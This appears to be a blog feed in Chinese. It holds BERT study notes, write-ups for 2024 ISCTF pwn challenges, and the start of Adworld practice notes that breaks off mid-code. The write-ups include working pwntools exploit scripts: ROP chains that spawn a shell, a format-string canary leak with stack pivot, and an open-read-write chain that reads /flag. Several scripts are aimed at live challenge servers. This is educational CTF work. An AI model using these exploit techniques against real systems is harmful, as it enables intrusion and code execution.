    <content type="html"><![CDATA[<h1 id="大创项目-基于人工智能的流量分析器"><a href="#大创项目-基于人工智能的流量分析器" class="headerlink" title="大创项目_基于人工智能的流量分析器"></a>大创项目_基于人工智能的流量分析器</h1><p>学习文章参考：<a href="https://blog.csdn.net/2401_85373691/article/details/144205368">BERT模型深度剖析：史上最详尽教程，不会还有人不懂吧？-CSDN博客</a></p><p>BERT（Bidirectional Encoder Representations from Transformers）是一种基于Transformer架构的双向语言表示模型，由Google在2018年发布。它通过在所有层中对左右上下文进行联合条件反射，从未标记的文本中预训练深度双向表示。BERT的创新之处在于借助Transformer学习双向表示，不同于递归神经网络（RNN）对顺序的依赖性，它能够并行处理整个序列，从而可以分析规模更大的数据集，并加快模型训练速度。</p><p>BERT的核心原理是在海量文本中学习词汇的双向上下文。它采用了Mask Language Model (MLM) 和 Next Sentence Prediction (NSP) 两种预训练任务。MLM让BERT猜测被遮住的词，而NSP则帮助理解句子之间的关系。通过这种方式，BERT具备了惊人的语义理解能力。BERT的输入是一个原始的文本序列，它可以是单个句子，也可以是两个句子（例如，问答任务中的问题和答案）。在输入到模型之前，这些文本需要经过特定的预处理步骤。</p><p>BERT的网络结构由多个Transformer编码器层堆叠而成。每个编码器层都包含自注意力机制和前馈神经网络，允许模型捕捉输入序列中的复杂依赖关系。自注意力机制允许模型在处理序列时关注不同位置的Token，并计算Token之间的注意力权重，从而捕捉输入序列中的依赖关系。BERT的输出取决于特定的任务。在预训练阶段，BERT采用了两种任务：Masked Language Model（MLM）和Next Sentence Prediction（NSP）。</p><p>BERT模型的输入通过结合Token Embeddings、Segment Embeddings和Position Embeddings三种嵌入方式，能够全面捕获文本的语义和上下文信息，为各类自然语言处理任务提供强大的基础表示能力。BERT的工作原理是通过在大规模未标注数据上执行预训练任务（如Masked Language Model来捕获文本中词汇的双向上下文关系，以及Next Sentence Prediction来理解句子间的逻辑关系），再将预训练的模型针对特定任务进行Fine tuning，从而在各种自然语言处理任务中实现高性能。</p><p><strong>总览了解：</strong></p><p><strong>step_1: pre_training [预训练]</strong></p><p>MLM: Master Language Model 通俗地理解就是，在输入一句话时，随机地选择要预测的词，用特殊符号mask来遮掩代替，之后让模型根据标签学习预测</p><p>NSP: Next Sentence Prediction 在双向语言模型的基础上额外增加了一个句子级别的连续型预测任务，更好地让模型学习到连续片段之间地关系</p><p>**1.**输入文本，然后用向量表示，经过bert模型【由多个transformer Encoder组成】，最后输出</p><p><img src="/../00000000/image-20250318212143877.png" alt="image-20250318212143877"></p><p>下方进来的是输入文本</p><p><strong>step_2: fine_tuning   [微调]</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell">以下是一个从零基础到学习BERT模型的短期规划路线，目标是帮助你在较短时间内入门BERT模型：<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 第一阶段：基础准备（第1-2周）</span></span><br>1. **数学基础**：<br>   - 学习线性代数、微积分、概率论与数理统计等基础知识。这些是理解大模型原理和算法的基石。<br>   - 推荐资源：可参考《线性代数及其应用》《概率论与数理统计》等教材，或在线课程如Coursera上的相关数学课程。<br>2. **编程语言**：<br>   - 熟练掌握Python编程，这是大模型开发的首选语言。<br>   - 推荐资源：可以通过《Python编程从入门到实践》等书籍，或在线平台如LeetCode进行练习。<br>3. **深度学习基础**：<br>   - 学习深度学习的基本原理和常用算法，如神经网络、卷积神经网络（CNN）、循环神经网络（RNN）等。<br>   - 推荐资源：可参考《深度学习》（Goodfellow等著）这本书，或在线课程如吴恩达的《深度学习专项课程》。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 第二阶段：核心知识学习（第3-4周）</span></span><br>1. **Transformer模型**：<br>   - 深入理解Transformer的原理、结构及其变种。Transformer是BERT模型的核心架构，其自注意力机制在处理序列数据方面表现出色。<br>   - 推荐资源：阅读Transformer的原始论文《Attention Is All You Need》，并结合博客、教程进行学习，如Jay Alammar的《The Illustrated Transformer》。<br>2. **预训练技术**：<br>   - 掌握大模型预训练的基本原理、方法和技巧。预训练技术是提高模型泛化能力的重要手段。<br>   - 推荐资源：阅读BERT的原始论文《BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding》，并结合Hugging Face的Transformers库进行实践。<br>3. **自然语言处理基础**：<br>   - 学习文本预处理技术、词嵌入、语言模型等NLP基础知识。<br>   - 推荐资源：可参考《自然语言处理综论》（Jurafsky等著），或在线课程如斯坦福大学的《自然语言处理课程》。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 第三阶段：BERT模型学习与实践（第5-6周）</span></span><br>1. **BERT模型原理**：<br>   - 深入学习BERT模型的架构、训练目标（如Masked Language Model和Next Sentence Prediction）。<br>   - 推荐资源：阅读BERT的原始论文，结合Hugging Face的Transformers库进行代码实践。<br>2. **实践项目**：<br>   - 使用Hugging Face的Transformers库加载预训练的BERT模型，并进行简单的微调任务，如文本分类、命名实体识别等。<br>   - 示例代码：<br>     ```python<br>     from transformers import BertTokenizer, BertForSequenceClassification<br>     from datasets import load_dataset<br>     import torch<br><br>     # 加载预训练模型和分词器<br>     tokenizer = BertTokenizer.from_pretrained(&#x27;bert-base-uncased&#x27;)<br>     model = BertForSequenceClassification.from_pretrained(&#x27;bert-base-uncased&#x27;)<br><br>     # 准备数据集<br>     dataset = load_dataset(&#x27;glue&#x27;, &#x27;mrpc&#x27;)<br>     tokenized_dataset = dataset.map(lambda examples: tokenizer(examples[&#x27;sentence1&#x27;], examples[&#x27;sentence2&#x27;], truncation=True, padding=&#x27;max_length&#x27;), batched=True)<br><br>     # 微调模型<br>     training_args = TrainingArguments(output_dir=&#x27;./results&#x27;, num_train_epochs=3, per_device_train_batch_size=16)<br>     trainer = Trainer(model=model, args=training_args, train_dataset=tokenized_dataset[&#x27;train&#x27;])<br>     trainer.train()<br>     ```<br>3. **调试与优化**：<br>   - 学习如何调整BERT模型的超参数（如学习率、批大小等），并优化模型性能。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 第四阶段：扩展与总结（第7周）</span></span><br>1. **扩展学习**：<br>   - 学习BERT模型的变种，如RoBERTa、ALBERT等，了解它们的改进点和应用场景。<br>2. **总结与反思**：<br>   - 总结学习过程中的经验教训，梳理知识体系，为后续深入学习大模型打下基础。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 学习建议</span></span><br>- **时间管理**：合理安排每天的学习时间，保持高效学习。<br>- **实践为主**：通过实际项目和代码实践加深对BERT模型的理解。<br>- **多渠道学习**：结合书籍、论文、在线课程、开源代码等多种资源进行学习。<br><br>希望这个规划能帮助你快速入门BERT模型！<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>大模型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024ISCTF</title>
    <link href="/2024_ISCTF_Pwn/"/>
    <url>/2024_ISCTF_Pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-ISCTF-Pwn"><a href="#2024-ISCTF-Pwn" class="headerlink" title="2024_ISCTF_Pwn"></a>2024_ISCTF_Pwn</h1><h2 id="小蓝鲨的stack"><a href="#小蓝鲨的stack" class="headerlink" title="小蓝鲨的stack"></a>小蓝鲨的stack</h2><p><strong>出题人：安阳工学院_笙南</strong></p><p><strong>解题过程：</strong></p><p>⽐较少⻅的⼀个题型，不过并不难，</p><p>ida64查看代码发现只有⼀个read和printf打印我们输⼊的东西 这⾥是没办法通过rop链去泄露libc地址的。</p><p> 程序原设定的返回地址是</p><p><img src="/../00000000/image-20250320113610314.png" alt="image-20250320113610314"></p><p>⽽我们需要利⽤的正是__libc_start_main⾥⾯的⼀段gadget 我们将libc⽂件拖⼊ida，分析__libc_start_main段上的汇编</p><p><img src="/../00000000/image-20250320113634738.png" alt="image-20250320113634738"></p><p>程序原返回地址是24083这⾥，我们发现在该地址上⾯还有⼀段call rax，⽽此时rax恰好被赋值为了main函数起始地址，也就是说 我们将返回地址修改为mov rax这⾥就可以再次返回到main函数，并且由于printf函数会打印我们输⼊的东西，我们还可以把返回地 址给打印出来，这样我们就拿到了libc地址，以及第⼆次利⽤read函数，接下来就是直接打rop链获得权限。</p><p><img src="/../00000000/image-20250320113757543.png" alt="image-20250320113757543"></p><p>调试之后发现确实会回到main函数</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from struct import pack<br>import ctypes<br>context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)<br>#p=process(&#x27;./ezstack&#x27;)<br>p=remote(&#x27;27.25.151.12&#x27;,28909)<br>elf=ELF(&#x27;./ezstack&#x27;)<br>#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;)<br>libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)<br>def bug():<br>gdb.attach(p)<br>pause()<br>def s(a):<br>p.send(a)<br>def sa(a,b):<br>p.sendafter(a,b)<br>def sl(a):<br>p.sendline(a)<br>def sla(a,b):<br>p.sendlineafter(a,b)<br>def r(a):<br>p.recv(a)<br>def pr(a):<br>print(p.recv(a))<br>def rl(a):<br>return p.recvuntil(a)<br>def inter():<br>p.interactive()<br>def get_addr64():<br>return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>def get_addr32():<br>return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])<br>def get_sb():<br>return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()<br>li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>#bug()<br>s(b&#x27;a&#x27;*0x28+b&#x27;\x7c&#x27;)<br>libc_base=get_addr64()-147580<br>li(hex(libc_base))<br>system,bin=get_sb()<br>rdi=libc_base+0x0000000000023b6a<br>pay=b&#x27;a&#x27;*0x28+p64(rdi)+p64(bin)+p64(rdi+1)+p64(system)<br>s(pay)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="Orange"><a href="#Orange" class="headerlink" title="Orange"></a>Orange</h2><p><strong>出题⼈：SunD1y</strong></p><p><strong>解题过程：</strong></p><p>菜单题，edit可以溢出，⽆free，使⽤houseoforange 构造largebinattack攻击，接着使⽤edit溢出泄漏heap和libc地址触发 largebin attack，布置好fakeIOFILE之后调⽤exit触发getshell</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br># encoding: utf-8<br>from pwn import *<br>import time<br>import numpy as np<br>from pwncli import *<br>local_file  = &#x27;./pwn&#x27;<br>elf = ELF(local_file)<br>libc=ELF(&#x27;libc.so.6&#x27;)<br>context.log_level = &#x27;debug&#x27;<br>context.arch = elf.arch<br>context.terminal = [&#x27;tmux&#x27;,&#x27;neww&#x27;]<br>#,&#x27;&#x27;splitw&#x27;,&#x27;-h&#x27;&#x27;<br><br></code></pre></td></tr></table></figure><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p><strong>出题⼈:b55t4ck</strong></p><p><strong>解题过程：</strong></p><p>通过nc⼯具连接即可获得flag，linux系统⼀般⾃带nc，Windows可能需要安装nc.exe</p><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><p><strong>出题⼈:b55t4ck</strong></p><p><strong>解题过程：</strong></p><p>从IDA里面分析就是，s1越界读取，覆盖为admin，然后进入vuln中，观察到存在数组溢出，通过数组溢出就可以修改溢出长度至ret_addr的位置，随后就可以跳转到后门函数</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>p=remote(&quot;27.25.151.12&quot;,25632)<br>#p=process(&quot;./pwn&quot;)<br>elf=ELF(&quot;./pwn&quot;)<br>p.sendafter(b&#x27;first i need your team id&#x27;,b&#x27;a&#x27;*0x28+b&#x27;admin&#x27;)<br>#gdb.attach(p)<br><br>p.sendlineafter(b&#x27;please input your 1 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 2 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 3 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 4 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 5 girlfriend birthday&#x27;,b&#x27;6&#x27;)<br>p.sendlineafter(b&#x27;please input your 6 girlfriend birthday&#x27;,b&#x27;6&#x27;)<br><br>p.sendlineafter(b&#x27;please input your 8 girlfriend birthday&#x27;,b&#x27;4198942&#x27;)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h2><p><strong>出题⼈:b55t4ck</strong></p><p><strong>解题思路:</strong></p><p>给了后门函数，但是跳转后会出现bad syscall的报错，在init函数中可以看到禁用了system调用。既然可以栈溢出，那么我们就可以利⽤gadget去调⽤libc⾥⾯存在的open,read,write。从⽽读取flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>from struct import pack<br>from ctypes import *<br>import base64<br>#from LibcSearcher import *<br><br>def debug(c = 0):<br>if(c):<br>gdb.attach(p, c)<br>else:<br>gdb.attach(p)<br>pause()<br>def get_sb() :<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br> #------------------------------------------------------------------------------------------------------------------------------<br>s = lambda data : p.send(data)<br>sa  = lambda text,data  :p.sendafter(text, data)<br>sl  = lambda data   :p.sendline(data)<br>sla = lambda text,data  :p.sendlineafter(text, data)<br>r   = lambda num=4096   :p.recv(num)<br>rl  = lambda text   :p.recvuntil(text)<br>pr = lambda num=4096 :print(p.recv(num))<br>inter   = lambda    :p.interactive()<br>l32 = lambda    :u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>l64 = lambda:u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu32    = lambda    :u32(p.recv(4).ljust(4,b&#x27;\x00&#x27;))<br>uu64    = lambda    :u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>int16   = lambda data   :int(data,16)<br>lg= lambda s, num   :p.success(&#x27;%s -&gt; 0x%x&#x27; % (s, num))<br>#-------------------------------------------------------------------------------------------------------------------------------<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>#p = process(&#x27;./pwn&#x27;)<br>p=remote(&quot;gz.imxbt.cn&quot;,20370)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br> <br>pop_rdi = 0x00000000004012CE<br>ret = 0x4010CF<br><br>#debug(&#x27;b *0x4012a0&#x27;)<br>#gdb.attach(p)<br>sa(b&#x27;this?\n&#x27;, b&#x27;a&#x27;*0x28 + p64(pop_rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + <br>p64(elf.sym[&#x27;main&#x27;]))<br>pause()<br><br>libc_base = uu64() - libc.sym[&#x27;puts&#x27;]<br>print(hex(libc_base))<br>pause()<br><br>system, binsh = get_sb()<br>rax = libc_base + 0x45eb0<br>syscall = libc_base + next(libc.search(asm(&#x27;syscall; ret;&#x27;)))<br>rdi = libc_base + 0x2a3e5<br>rsi = libc_base + 0x2be51<br>rdx_r12 = libc_base + 0x11f2e7<br>mprotect = libc_base + libc.sym[&#x27;mprotect&#x27;]<br>open_ = libc_base + libc.sym[&#x27;open&#x27;]<br>read = libc_base + libc.sym[&#x27;read&#x27;]<br>write = libc_base + libc.sym[&#x27;write&#x27;]<br>buf = 0x4040D0<br>flag = 0x4040a0<br>payload = b&#x27;a&#x27;*0x28<br># read flag -&gt; buf<br>payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)<br># open flag<br>payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)<br># read flag<br>payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)<br># write flag<br>payload += p64(rdi) + p64(1) + p64(write)<br>sa(b&#x27;this?\n&#x27;, payload)<br>sleep(1)<br>s(b&#x27;/flag&#x27;)<br><br>#pause()<br>inter()<br></code></pre></td></tr></table></figure><h2 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h2><p><strong>出题⼈:b55t4ck</strong></p><p>⼀道⽐较综合的题⽬，考察栈迁移，格式化字符串，还有防御机制绕过的漏洞，⾸先可以通过格式化字符串泄露canary，和libc。 再通过vuln函数溢出的⼀个字节实现栈迁移，从⽽劫持程序执⾏流，然后再通过one_gadget即可获取shell。需要注意的是，本地环 境需保持与远程⼀致，不然可能出现本地打得通远程打不通的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br> p=remote(&quot;27.25.151.12&quot;,39834)<br> #p=process(&quot;./stack&quot;)<br> elf=ELF(&quot;./stack&quot;)<br> libc=ELF(&quot;/home/giant/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;)<br> #gdb.attach(p)<br> p.sendlineafter(b&#x27;?\n&#x27;,b&#x27;a&#x27;*0x1)<br> p.sendafter(b&#x27;!\n&#x27;,b&#x27;\x00&#x27;*8+b&#x27;%3$p%9$p%15$p&#x27;)<br> libc_base=int(p.recv(14),16)-libc.sym[&quot;read&quot;]-18<br> print(hex(libc_base))<br> canary=int(p.recv(18),16)<br> stack_addr=int(p.recv(14),16)-0x158<br> print(hex(stack_addr))<br> ogg=libc_base+0xebd43<br> kx=libc_base+0x21c100<br> a = int((hex(stack_addr)[-2:]),16)<br> p.sendafter(b&#x27;?\n&#x27;,p64(canary)+p64(kx)+p64(ogg)+p64(canary)+p8(a-8))<br> p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h2><p><strong>出题⼈：Qjzhalx</strong></p><p><strong>解题过程</strong></p><p>利用gets覆盖掉seeds</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>from ctypes import *<br>context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)<br>q = process(&quot;./pwn&quot;)<br>libc = cdll.LoadLibrary(&quot;./libc.so.6&quot;)<br>payload = b&quot;a&quot; * 400 + p64(0)<br>q.sendline(payload)<br>libc.srand(0)<br>for i in range(20001):<br>num = str(libc.rand()%7+1)<br>q.sendline(num)<br>q.recvuntil(&quot;It&#x27;s your reward, take advantage of it.&quot;)<br>q.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AD-world</title>
    <link href="/ADWORLD/"/>
    <url>/ADWORLD/</url>
    
    <content type="html"><![CDATA[<h1 id="攻防世界刷题笔记"><a href="#攻防世界刷题笔记" class="headerlink" title="攻防世界刷题笔记"></a>攻防世界刷题笔记</h1><h3 id="new-easypwn"><a href="#new-easypwn" class="headerlink" title="new-easypwn"></a>new-easypwn</h3><p><strong>checksec:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/practice$ checksec hello<br>[*] &#x27;/mnt/d/111/practice/hello&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br></code></pre></td></tr></table></figure><p><strong>IDA:</strong></p><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br><br>  sub_B56(a1, a2, a3);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v3 = sub_C32();<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_1003();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>      &#123;<br>        sub_10EB();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_CCE();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bad choice!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      sub_E13();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_B56()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_B56</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span 